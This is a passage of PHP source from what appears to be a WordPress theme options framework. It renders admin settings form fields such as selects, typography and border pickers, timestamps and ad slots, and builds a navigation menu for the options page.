				$menu_items[$token] = $v;
				$prev_heading_key = $token;
			}
			
			if ( $v['type'] == 'subheading' ) {
				$menu_items[$prev_heading_key]['children'][] = $v;
			}
		}

		// Loop through the options.
		foreach ( $options as $k => $value ) {

			$counter++;
			$val = '';
			//Start Heading
			if ( $value['type'] != 'heading' && $value['type'] != 'subheading' ) {
				$class = ''; if( isset( $value['class'] ) ) { $class = ' ' . $value['class']; }
				$output .= '<div class="section section-'.$value['type'] . $class .'">'."\n";
				$output .= '<h3 class="heading">'. $value['name'] .'</h3>'."\n";
				$output .= '<div class="option">'."\n" . '<div class="controls">'."\n";

			}
			//End Heading
                        
                        if(!isset ($value['std']))
                            $value['std']   = '';
			
			$select_value = '';
			switch ( $value['type'] ) {

			case 'text':
				$val = $value['std'];
				$std = get_option( $value['id'] );
				if ( $std != "" ) { $val = $std; }
				$val = stripslashes( $val ); // Strip out unwanted slashes.
				$output .= '<input class="nesia-input" name="'. $value['id'] .'" id="'. $value['id'] .'" type="'. $value['type'] .'" value="'. esc_attr( $val ) .'" />';
				break;

			case 'select':
				$output .= '<div class="select_wrapper"><select class="nesia-input" name="'. $value['id'] .'" id="'. $value['id'] .'">';

				$select_value = stripslashes( get_option( $value['id'] ) );

				foreach ( $value['options'] as $option ) {

					$selected = '';

					if( $select_value != '' ) {
						if ( $select_value == $option ) { $selected = ' selected="selected"';}
					} else {
						if ( isset( $value['std'] ) )
							if ( $value['std'] == $option ) { $selected = ' selected="selected"'; }
					}

					$output .= '<option'. $selected .'>';
					$output .= $option;
					$output .= '</option>';

				}
				$output .= '</select></div>';

				break;
			
			case 'select2':
				$output .= '<div class="select_wrapper">' . "\n";

				if ( is_array( $value['options'] ) ) {
					$output .= '<select class="nesia-input" name="'. $value['id'] .'" id="'. $value['id'] .'">';

					$select_value = stripslashes( get_option( $value['id'] ) );


					foreach ( $value['options'] as $option => $name ) {

						$selected = '';

						if( $select_value != '' ) {
							if ( $select_value == $option ) { $selected = ' selected="selected"';}
						} else {
							if ( isset( $value['std'] ) )
								if ( $value['std'] == $option ) { $selected = ' selected="selected"'; }
						}

						$output .= '<option'. $selected .' value="'.esc_attr( $option ).'">';
						$output .= $name;
						$output .= '</option>';

					}
					$output .= '</select>' . "\n";
				}

				$output .= '</div>';

				break;
			
      case 'font':
        $output .= '<div class="select_wrapper">' . "\n";

        if ( is_array( $value['options'] ) ) {
          $output .= '<select class="nesia-input" name="'. $value['id'] .'" id="'. $value['id'] .'">';

          $select_value = stripslashes( get_option( $value['id'] ) );


          foreach ( $value['options'] as $option => $name ) {

            $selected = '';

            if( $select_value != '' ) {
              if ( $select_value == $option ) { $selected = ' selected="selected"';}
            } else {
              if ( isset( $value['std'] ) )
                if ( $value['std'] == $option ) { $selected = ' selected="selected"'; }
            }

            $output .= '<option'. $selected .' value="'.esc_attr( $option ).'">';
            $output .= $name;
            $output .= '</option>';

          }
          $output .= '</select>' . "\n";
        }

        $output .= '</div>';

        break;

			case 'calendar':
				$val = $value['std'];
				$std = get_option( $value['id'] );
				if ( $std != "" ) { $val = $std; }
				$output .= '<input class="nesia-input-calendar" type="text" name="'.$value['id'].'" id="'.$value['id'].'" value="'.esc_attr( $val ).'">';
				$output .= '<input type="hidden" name="datepicker-image" value="' . get_template_directory_uri() . '/functions/images/calendar.gif" />';

				break;
				
			case 'time':
				$val = $value['std'];
				$std = get_option( $value['id'] );
				if ( $std != "" ) { $val = $std; }
				$output .= '<input class="nesia-input-time" name="'. $value['id'] .'" id="'. $value['id'] .'" type="text" value="'. esc_attr( $val ) .'" />';
				break;
				
			case 'textarea':
				$cols = '8';
				$ta_value = '';

				if( isset( $value['std'] ) ) {

					$ta_value = $value['std'];

					if( isset( $value['options'] ) ) {
						$ta_options = $value['options'];
						if( isset( $ta_options['cols'] ) ) {
							$cols = $ta_options['cols'];
						} else { $cols = '8'; }
					}

				}
				$std = get_option( $value['id'] );
				if( $std != "" ) { $ta_value = stripslashes( $std ); }
				$output .= '<textarea ' . ( !current_user_can( 'unfiltered_html' ) && in_array( $value['id'], nesia_disabled_if_not_unfiltered_html_option_keys() ) ? 'disabled="disabled" ' : '' ) . 'class="nesia-input" name="'. $value['id'] .'" id="'. $value['id'] .'" cols="'. $cols .'" rows="8">'.esc_textarea( $ta_value ).'</textarea>';


				break;
				
			case "radio":
				$select_value = get_option( $value['id'] );

				if ( is_array( $value['options'] ) ) {
					foreach ( $value['options'] as $key => $option ) {

						$checked = '';
						if( $select_value != '' ) {
							if ( $select_value == $key ) { $checked = ' checked'; }
						} else {
							if ( $value['std'] == $key ) { $checked = ' checked'; }
						}
						$output .= '<div class="radio-wrapper"><input class="nesia-input nesia-radio" type="radio" name="'. $value['id'] .'" value="'. esc_attr( $key ) .'" '. $checked .' /><label>' . $option .'</label></div>';

					}
				}

				break;
				
			case "checkbox":
				$std = $value['std'];

				$saved_std = get_option( $value['id'] );

				$checked = '';

				if( ! empty( $saved_std ) ) {
					if( $saved_std == 'true' ) {
						$checked = 'checked="checked"';
					} else {
						$checked = '';
					}
				}
				elseif( $std == 'true' ) {
					$checked = 'checked="checked"';
				}
				else {
					$checked = '';
				}
				$output .= '<input type="checkbox" class="checkbox nesia-input" name="'.  $value['id'] .'" id="'. $value['id'] .'" value="true" '. $checked .' />';

				break;
				
			case "multicheck":
				$std =  $value['std'];

				if ( is_array( $value['options'] ) ) {
					foreach ( $value['options'] as $key => $option ) {

						$nesia_key = $value['id'] . '_' . $key;
						$saved_std = get_option( $nesia_key );

						if ( ! empty( $saved_std ) ) {
							if ( $saved_std == 'true' ) {
								$checked = 'checked="checked"';
							} else {
								$checked = '';
							}
						} elseif ( $std == $key ) {
							$checked = 'checked="checked"';
						} else {
							$checked = '';
						}
						$output .= '<input type="checkbox" class="checkbox nesia-input" name="'. $nesia_key .'" id="'. $nesia_key .'" value="true" '. $checked .' /><label for="'. $nesia_key .'">'. $option .'</label><br />';

					}
				}
				break;
			
			case "multicheck2":
				$std =  explode( ',', $value['std'] );

				if ( is_array( $value['options'] ) ) {
					foreach ( $value['options'] as $key => $option ) {

						$nesia_key = $value['id'] . '_' . $key;
						$saved_std = get_option( $nesia_key );

						if( ! empty( $saved_std ) )
						{
							if( $saved_std == 'true' ) {
								$checked = 'checked="checked"';
							} else {
								$checked = '';
							}
						}
						elseif ( in_array( $key, $std ) ) {
							$checked = 'checked="checked"';
						} else {
							$checked = '';
						}
						$output .= '<input type="checkbox" class="checkbox nesia-input" name="'. $nesia_key .'" id="'. $nesia_key .'" value="true" '. $checked .' /><label for="'. $nesia_key .'">'. $option .'</label><br />';

					}
				}
				break;
			
			case "multicheck3":

				if ( is_array( $value['options'] ) ) {
					foreach ( $value['options'] as $key => $option ) {

						$nesia_key = $value['id'];
						$saved_std = get_option( $nesia_key, array() );
                                                
                                                if ( !empty($saved_std) ){
                                                    if ( in_array( $key, $saved_std ) ) {
                                                            $checked = 'checked="checked"';
                                                    } else {
                                                            $checked = '';
                                                    }
                                                }
						$output .= '<label for="'. $nesia_key . $key .'"><input type="checkbox" class="checkbox nesia-input" name="'. $nesia_key .'[]" id="'. $nesia_key . $key .'" value="'. $key .'" '. $checked .' />'. $option .'</label><br/>';

					}
				}
				break;
				
			case "upload":
				$output .= nesia_medialibrary_uploader( $value['id'], $value['std'], null ); // New AJAX Uploader using Media Library
				break;
				
			case "upload_min":
				$output .= nesia_medialibrary_uploader( $value['id'], $value['std'], 'min' ); // New AJAX Uploader using Media Library
				break;
				
			case "color":
				$val = $value['std'];
				$stored  = get_option( $value['id'] );
				if ( $stored != "" ) { $val = $stored; }
				$output .= '<div id="' . $value['id'] . '_picker" class="colorSelector"><div style="background-color: '. esc_attr( $val ) .'"></div></div>';
				$output .= '<input class="nesia-color" name="'. $value['id'] .'" id="'. $value['id'] .'" type="text" value="'. esc_attr( $val ) .'" />';
				break;

			case "typography":
				$default = $value['std'];
				$typography_stored = get_option( $value['id'] );

				/* Font Size */
				$val = $default['size'];
				if ( $typography_stored['size'] != "" ) { $val = $typography_stored['size']; }
				if ( $typography_stored['unit'] == 'px' ) { $show_px = ''; $show_em = ' style="display:none" '; $name_px = ' name="'. $value['id'].'_size" '; $name_em = ''; }
				else if ( $typography_stored['unit'] == 'em' ) { $show_em = ''; $show_px = 'style="display:none"'; $name_em = ' name="'. $value['id'].'_size" '; $name_px = ''; }
				else { $show_px = ''; $show_em = ' style="display:none" '; $name_px = ' name="'. $value['id'].'_size" '; $name_em = ''; }
				$output .= '<select class="nesia-typography nesia-typography-size nesia-typography-size-px"  id="'. $value['id'].'_size_px" '. $name_px . $show_px .'>';
				for ( $i = 9; $i < 71; $i++ ) {
					if( $val == strval( $i ) ) { $active = 'selected="selected"'; } else { $active = ''; }
					$output .= '<option value="'. $i .'" ' . $active . '>'. $i .'</option>'; }
				$output .= '</select>';

				$output .= '<select class="nesia-typography nesia-typography-size nesia-typography-size-em" id="'. $value['id'].'_size_em" '. $name_em . $show_em.'>';
				$em = 0.5;
				for ( $i = 0; $i < 39; $i++ ) {
					if ( $i <= 24 )   // up to 2.0em in 0.1 increments
						$em = $em + 0.1;
					elseif ( $i >= 14 && $i <= 24 )  // Above 2.0em to 3.0em in 0.2 increments
						$em = $em + 0.2;
					elseif ( $i >= 24 )  // Above 3.0em in 0.5 increments
						$em = $em + 0.5;
					if( $val == strval( $em ) ) { $active = 'selected="selected"'; } else { $active = ''; }
					//echo ' '. $value['id'] .' val:'.floatval($val). ' -> ' . floatval($em) . ' $<br />' ;
					$output .= '<option value="'. $em .'" ' . $active . '>'. $em .'</option>'; }
				$output .= '</select>';

				/* Font Unit */
				$val = $default['unit'];
				if ( $typography_stored['unit'] != "" ) { $val = $typography_stored['unit']; }
				$em = ''; $px = '';
				if( $val == 'em' ) { $em = 'selected="selected"'; }
				if( $val == 'px' ) { $px = 'selected="selected"'; }
				$output .= '<select class="nesia-typography nesia-typography-unit" name="'. $value['id'].'_unit" id="'. $value['id'].'_unit">';
				$output .= '<option value="px" '. $px .'">px</option>';
				$output .= '<option value="em" '. $em .'>em</option>';
				$output .= '</select>';

				/* Font Face */
				$val = $default['face'];
				if ( $typography_stored['face'] != "" )
					$val = $typography_stored['face'];

				$font01 = '';
				$font02 = '';
				$font03 = '';
				$font04 = '';
				$font05 = '';
				$font06 = '';
				$font07 = '';
				$font08 = '';
				$font09 = '';
				$font10 = '';
				$font11 = '';
				$font12 = '';
				$font13 = '';
				$font14 = '';
				$font15 = '';
				$font16 = '';

				if ( strpos( $val, 'Arial, sans-serif' ) !== false ) { $font01 = 'selected="selected"'; }
				if ( strpos( $val, 'Verdana, Geneva' ) !== false ) { $font02 = 'selected="selected"'; }
				if ( strpos( $val, 'Trebuchet' ) !== false ) { $font03 = 'selected="selected"'; }
				if ( strpos( $val, 'Georgia' ) !== false ) { $font04 = 'selected="selected"'; }
				if ( strpos( $val, 'Times New Roman' ) !== false ) { $font05 = 'selected="selected"'; }
				if ( strpos( $val, 'Tahoma, Geneva' ) !== false ) { $font06 = 'selected="selected"'; }
				if ( strpos( $val, 'Palatino' ) !== false ) { $font07 = 'selected="selected"'; }
				if ( strpos( $val, 'Helvetica' ) !== false ) { $font08 = 'selected="selected"'; }
				if ( strpos( $val, 'Calibri' ) !== false ) { $font09 = 'selected="selected"'; }
				if ( strpos( $val, 'Myriad' ) !== false ) { $font10 = 'selected="selected"'; }
				if ( strpos( $val, 'Lucida' ) !== false ) { $font11 = 'selected="selected"'; }
				if ( strpos( $val, 'Arial Black' ) !== false ) { $font12 = 'selected="selected"'; }
				if ( strpos( $val, 'Gill' ) !== false ) { $font13 = 'selected="selected"'; }
				if ( strpos( $val, 'Geneva, Tahoma' ) !== false ) { $font14 = 'selected="selected"'; }
				if ( strpos( $val, 'Impact' ) !== false ) { $font15 = 'selected="selected"'; }
				if ( strpos( $val, 'Courier' ) !== false ) { $font16 = 'selected="selected"'; }

				$output .= '<select class="nesia-typography nesia-typography-face" name="'. $value['id'].'_face" id="'. $value['id'].'_face">';
				$output .= '<option value="Arial, sans-serif" '. $font01 .'>Arial</option>';
				$output .= '<option value="Verdana, Geneva, sans-serif" '. $font02 .'>Verdana</option>';
				$output .= '<option value="&quot;Trebuchet MS&quot;, Tahoma, sans-serif"'. $font03 .'>Trebuchet</option>';
				$output .= '<option value="Georgia, serif" '. $font04 .'>Georgia</option>';
				$output .= '<option value="&quot;Times New Roman&quot;, serif"'. $font05 .'>Times New Roman</option>';
				$output .= '<option value="Tahoma, Geneva, Verdana, sans-serif"'. $font06 .'>Tahoma</option>';
				$output .= '<option value="Palatino, &quot;Palatino Linotype&quot;, serif"'. $font07 .'>Palatino</option>';
				$output .= '<option value="&quot;Helvetica Neue&quot;, Helvetica, sans-serif" '. $font08 .'>Helvetica*</option>';
				$output .= '<option value="Calibri, Candara, Segoe, Optima, sans-serif"'. $font09 .'>Calibri*</option>';
				$output .= '<option value="&quot;Myriad Pro&quot;, Myriad, sans-serif"'. $font10 .'>Myriad Pro*</option>';
				$output .= '<option value="&quot;Lucida Grande&quot;, &quot;Lucida Sans Unicode&quot;, &quot;Lucida Sans&quot;, sans-serif"'. $font11 .'>Lucida</option>';
				$output .= '<option value="&quot;Arial Black&quot;, sans-serif" '. $font12 .'>Arial Black</option>';
				$output .= '<option value="&quot;Gill Sans&quot;, &quot;Gill Sans MT&quot;, Calibri, sans-serif" '. $font13 .'>Gill Sans*</option>';
				$output .= '<option value="Geneva, Tahoma, Verdana, sans-serif" '. $font14 .'>Geneva*</option>';
				$output .= '<option value="Impact, Charcoal, sans-serif" '. $font15 .'>Impact</option>';
				$output .= '<option value="Courier, &quot;Courier New&quot;, monospace" '. $font16 .'>Courier</option>';

				// Google webfonts
				global $google_fonts;
				sort( $google_fonts );

				$output .= '<option value="">-- Google Fonts --</option>';
				foreach ( $google_fonts as $key => $gfont ) :
					$font[$key] = '';
				if ( $val == $gfont['name'] ) { $font[$key] = 'selected="selected"'; }
				$name = $gfont['name'];
				$output .= '<option value="'.$name.'" '. $font[$key] .'>'.$name.'</option>';
				endforeach;

				// Custom Font stack
				$new_stacks = get_option( 'framework_nesia_font_stack' );
				if( !empty( $new_stacks ) ) {
					$output .= '<option value="">-- Custom Font Stacks --</option>';
					foreach( $new_stacks as $name => $stack ) {
						if ( strpos( $val, $stack ) !== false ) { $fontstack = 'selected="selected"'; } else { $fontstack = ''; }
						$output .= '<option value="'. stripslashes( htmlentities( $stack ) ) .'" '.$fontstack.'>'. str_replace( '_', ' ', $name ).'</option>';
					}
				}

				$output .= '</select>';

				/* Font Weight */
				$val = $default['style'];
				if ( $typography_stored['style'] != "" ) { $val = $typography_stored['style']; }
				$normal = ''; $italic = ''; $bold = ''; $bolditalic = '';
				if( $val == 'normal' ) { $normal = 'selected="selected"'; }
				if( $val == 'italic' ) { $italic = 'selected="selected"'; }
				if( $val == 'bold' ) { $bold = 'selected="selected"'; }
				if( $val == 'bold italic' ) { $bolditalic = 'selected="selected"'; }

				$output .= '<select class="nesia-typography nesia-typography-style" name="'. $value['id'].'_style" id="'. $value['id'].'_style">';
				$output .= '<option value="normal" '. $normal .'>Normal</option>';
				$output .= '<option value="italic" '. $italic .'>Italic</option>';
				$output .= '<option value="bold" '. $bold .'>Bold</option>';
				$output .= '<option value="bold italic" '. $bolditalic .'>Bold/Italic</option>';
				$output .= '</select>';

				/* Font Color */
				$val = $default['color'];
				if ( $typography_stored['color'] != "" ) { $val = $typography_stored['color']; }
				$output .= '<div id="' . $value['id'] . '_color_picker" class="colorSelector"><div></div></div>';
				$output .= '<input class="nesia-color nesia-typography nesia-typography-color" name="'. $value['id'] .'_color" id="'. $value['id'] .'_color" type="text" value="'. esc_attr( $val ) .'" />';

				break;

			case "border":
				$default = $value['std'];
				$border_stored = get_option( $value['id'] );

				/* Border Width */
				$val = $default['width'];
				if ( $border_stored['width'] != "" ) { $val = $border_stored['width']; }
				$output .= '<select class="nesia-border nesia-border-width" name="'. $value['id'].'_width" id="'. $value['id'].'_width">';
				for ( $i = 0; $i < 21; $i++ ) {
					if( $val == $i ) { $active = 'selected="selected"'; } else { $active = ''; }
					$output .= '<option value="'. $i .'" ' . $active . '>'. $i .'px</option>'; }
				$output .= '</select>';

				/* Border Style */
				$val = $default['style'];
				if ( $border_stored['style'] != "" ) { $val = $border_stored['style']; }
				$solid = ''; $dashed = ''; $dotted = '';
				if( $val == 'solid' ) { $solid = 'selected="selected"'; }
				if( $val == 'dashed' ) { $dashed = 'selected="selected"'; }
				if( $val == 'dotted' ) { $dotted = 'selected="selected"'; }

				$output .= '<select class="nesia-border nesia-border-style" name="'. $value['id'].'_style" id="'. $value['id'].'_style">';
				$output .= '<option value="solid" '. $solid .'>Solid</option>';
				$output .= '<option value="dashed" '. $dashed .'>Dashed</option>';
				$output .= '<option value="dotted" '. $dotted .'>Dotted</option>';
				$output .= '</select>';

				/* Border Color */
				$val = $default['color'];
				if ( $border_stored['color'] != "" ) { $val = $border_stored['color']; }
				$output .= '<div id="' . $value['id'] . '_color_picker" class="colorSelector"><div></div></div>';
				$output .= '<input class="nesia-color nesia-border nesia-border-color" name="'. $value['id'] .'_color" id="'. $value['id'] .'_color" type="text" value="'. esc_attr( $val ) .'" />';

				break;

			case "images":
				$i = 0;
				$select_value = get_option( $value['id'] );

				foreach ( $value['options'] as $key => $option ) {
					$i++;

					$checked = '';
					$selected = '';
					if( $select_value != '' ) {
						if ( $select_value == $key ) { $checked = ' checked'; $selected = 'nesia-radio-img-selected'; }
					} else {
						if ( $value['std'] == $key ) { $checked = ' checked'; $selected = 'nesia-radio-img-selected'; }
						elseif ( $i == 1  && !isset( $select_value ) ) { $checked = ' checked'; $selected = 'nesia-radio-img-selected'; }
						elseif ( $i == 1  && $value['std'] == '' ) { $checked = ' checked'; $selected = 'nesia-radio-img-selected'; }
						else { $checked = ''; }
					}

					$output .= '<span class="'. $selected .'" onClick="document.getElementById(\'nesia-radio-img-'. $value['id'] . $i.'\').checked = true;">';
					$output .= '<input type="radio" id="nesia-radio-img-' . $value['id'] . $i . '" class="checkbox nesia-radio-img-radio" value="'. esc_attr( $key ) .'" name="'. $value['id'].'" '.$checked.' />';
					$output .= '<span class="nesia-radio-img-label">'. esc_html( $key ) .'</span>';
					$output .= '<img src="'.$option.'" alt="" class="nesia-radio-img-img" />';
					$output .= '</span>';

				}

				break;

			case "info":
				$default = $value['std'];
				$output .= $default;
				break;
			
			// Timestamp field.
			case 'timestamp':
				$val = get_option( $value['id'] );
				
				if ( $val == '' ) {
					$val = time();
				}
				
				$output .= '<input class="nesia-input-calendar" type="text" name="' . $value['id'] . '[date]" id="'.$value['id'].'" value="' . esc_attr( date( 'm/d/Y', $val ) ) . '">';
				$output .= '<input type="hidden" name="datepicker-image" value="' . get_template_directory_uri() . '/functions/images/calendar.gif" />';

				$output .= '<select name="' . $value['id'] . '[hour]" class="nesia-select-timestamp">' . "\n";
					for ( $i = 0; $i <= 23; $i++ ) {
						
						$j = $i;
						if ( $i < 10 ) {
							$j = '0' . $i;
						}
						
						$output .= '<option value="' . $i . '"' . selected( date( 'H', $val ), $j, false ) . '>' . $j . '</option>' . "\n";
					}
				$output .= '</select>' . "\n";
				
				$output .= '<select name="' . $value['id'] . '[minute]" class="nesia-select-timestamp">' . "\n";
					for ( $i = 0; $i <= 59; $i++ ) {
						
						$j = $i;
						if ( $i < 10 ) {
							$j = '0' . $i;
						}
						
						$output .= '<option value="' . $i . '"' . selected( date( 'i', $val ), $j, false ) .'>' . $j . '</option>' . "\n";
					}
				$output .= '</select>' . "\n";
				
				$output .= '<select name="' . $value['id'] . '[second]" class="nesia-select-timestamp">' . "\n";
					for ( $i = 0; $i <= 59; $i++ ) {
						
						$j = $i;
						if ( $i < 10 ) {
							$j = '0' . $i;
						}
						
						$output .= '<option value="' . $i . '"' . selected( date( 's', $val ), $j, false ) . '>' . $j . '</option>' . "\n";
					}
				$output .= '</select>' . "\n";
				
			break;
                        				
			case "ads":
                            
				$ads_array = get_option( $value['id'] );

				/* Ads Script */
				$val = $ads_array['script'];
				$output .= '<textarea ' . ( !current_user_can( 'unfiltered_html' ) && in_array( $value['id'], nesia_disabled_if_not_unfiltered_html_option_keys() ) ? 'disabled="disabled" ' : '' ) . 'class="nesia-input" name="'. $value['id'] .'_script" id="'. $value['id'] .'_script" cols="8" rows="8" placeholder="Custom Script">'.esc_textarea( $val ).'</textarea>';
                                
				/* Ads Script */
				$val = $ads_array['url'];
				$output .= '<input class="nesia-input" name="'. $value['id'] .'_url" id="'. $value['id'] .'_url" type="text" value="'. $val .'" style="width: 133px;" placeholder="'. __('URL Link', 'nesia') .'" />';
                                
                                // upload image
				$val = $ads_array['image'];
				$output .= nesia_medialibrary_uploader( $value['id'].'_image', $val, null, '', 0, 'style="width: 133px;" placeholder="Image URL" ' ); // New AJAX Uploader using Media Library
                            
				break;
				

			case "heading":
				if( $counter >= 2 ) {
					$output .= '</div>'."\n";
				}
				$jquery_click_hook = preg_replace( '/[^a-zA-Z0-9\s]/', '', strtolower( $value['name'] ) );
				// $jquery_click_hook = preg_replace( '/[^\p{L}\p{N}]/u', '', strtolower( $value['name'] ) ); // Regex for UTF-8 languages.
				$jquery_click_hook = str_replace( ' ', '', $jquery_click_hook );

				$jquery_click_hook = "nesia-option-" . $jquery_click_hook;
				$menu .= '<li class="'.$value['icon'].'"><a title="'.  $value['name'] .'" href="#'.  $jquery_click_hook  .'">'.  $value['name'] .'</a></li>';
				$output .= '<div class="group" id="'. $jquery_click_hook  .'"><h1 class="subtitle">'.$value['name'].'</h1>'."\n";
				break;
			
			case "subheading":
				if( $counter >= 2 ) {
					$output .= '</div>'."\n";
				}
				$jquery_click_hook = preg_replace( '/[^a-zA-Z0-9\s]/', '', strtolower( $value['name'] ) );
				// $jquery_click_hook = preg_replace( '/[^\p{L}\p{N}]/u', '', strtolower( $value['name'] ) ); // Regex for UTF-8 languages.
				$jquery_click_hook = str_replace( ' ', '', $jquery_click_hook );

				$jquery_click_hook = "nesia-option-" . $jquery_click_hook;
				$menu .= '<li><a title="' . $value['name'] . '" href="#' . $jquery_click_hook . '">' . $value['name'] . '</a></li>';
				$output .= '<div class="group" id="'. $jquery_click_hook  .'"><h1 class="subtitle">'.$value['name'].'</h1>'."\n";
				break;
			}

			// if TYPE is an array, formatted into smaller inputs... ie smaller values
			if ( is_array( $value['type'] ) ) {
				foreach( $value['type'] as $array ) {

					$id = $array['id'];
					$std = $array['std'];
					$saved_std = get_option( $id );
					if( $saved_std != $std ) {$std = $saved_std;}
					$meta = $array['meta'];

					if( $array['type'] == 'text' ) { // Only text at this point

						$output .= '<input class="input-text-small nesia-input" name="'. $id .'" id="'. $id .'" type="text" value="'. esc_attr( $std ) .'" />';
						$output .= '<span class="meta-two">'.$meta.'</span>';
					}
				}
			}
			if ( $value['type'] != "heading" && $value['type'] != "subheading" ) {
				if ( $value['type'] != "checkbox" )
				{
					$output .= '<br/>';
				}
				$explain_value = ( isset( $value['desc'] ) ) ? $value['desc'] : '';
				if ( !current_user_can( 'unfiltered_html' ) && isset( $value['id'] ) && in_array( $value['id'], nesia_disabled_if_not_unfiltered_html_option_keys() ) )
					$explain_value .= '<br /><br /><b>' . __( 'You are not able to update this option because you lack the <code>unfiltered_html</code> capability.', 'nesia' ) . '</b>';
				$output .= '</div><div class="explain">'. $explain_value .'</div>'."\n";
				$output .= '<div class="clear"> </div></div></div>'."\n";
			}

		}

		//Checks if is not the Content Builder page
		if ( isset( $_REQUEST['page'] ) && $_REQUEST['page'] != 'nesia_content_builder' ) {
			$output .= '</div>';
		}
		
		// Override the menu with a new multi-level menu.
		if ( count( $menu_items ) > 0 ) {
			$menu = '';
			foreach ( $menu_items as $k => $v ) {
				$class = '';
				if ( isset( $v['icon'] ) && ( $v['icon'] != '' ) ) {
					$class = $v['icon'];
				}
				
				if ( isset( $v['children'] ) && ( count( $v['children'] ) > 0 ) ) {
					$class .= ' has-children';
				}
				
				$menu .= '<li class="top-level ' . $class . '">' . "\n" . '<div class="arrow"><div></div></div>'; 
				if ( isset( $v['icon'] ) && ( $v['icon'] != '' ) )
					$menu .= '<span class="icon"></span>';
				$menu .= '<a title="' . $v['name'] . '" href="#' . $v['token'] . '">' . $v['name'] . '</a>' . "\n";
				
				if ( isset( $v['children'] ) && ( count( $v['children'] ) > 0 ) ) {
					$menu .= '<ul class="sub-menu">' . "\n";
						foreach ( $v['children'] as $i => $j ) {
							$menu .= '<li class="icon">' . "\n" . '<a title="' . $j['name'] . '" href="#' . $j['token'] . '">' . $j['name'] . '</a></li>' . "\n";
						}
					$menu .= '</ul>' . "\n";
				}
				$menu .= '</li>' . "\n";

			}
		}

		return array( $output, $menu, $menu_items );
	} // End nesia_machine()
}

/*-----------------------------------------------------------------------------------*/
/* Nesia Uploader - nesia_uploader_function */
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_uploader_function' ) ) {
	function nesia_uploader_function( $id, $std, $mod ) {
		return nesia_medialibrary_uploader( $id, $std, $mod );
	} // End nesia_uploader_function()
}

?>